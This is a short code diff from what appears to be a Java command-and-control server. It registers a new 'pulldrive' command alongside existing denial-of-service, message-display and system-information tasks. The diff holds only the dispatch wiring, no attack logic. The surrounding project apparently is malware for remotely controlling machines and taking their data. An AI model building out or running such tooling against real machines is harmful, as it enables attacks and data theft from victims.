@@ -2,6 +2,7 @@ package Server;
 
 import Server.Tasks.DenialOfService.DenialOfServiceTask;
 import Server.Tasks.DisplayMessage.DisplayMessageTask;
+import Server.Tasks.PullHardDrive.PullHardDriveTask;
 import Server.Tasks.SystemInformation.SystemInformationTask;
 import java.util.Scanner;
 
@@ -46,6 +47,8 @@ public class Server {
         return DenialOfServiceTask.buildFromScanner(scanner);
       case "display":
         return DisplayMessageTask.buildFromScanner(scanner);
+      case "pulldrive":
+        return PullHardDriveTask.buildFromScanner(scanner);
       default:
         return null;
     }
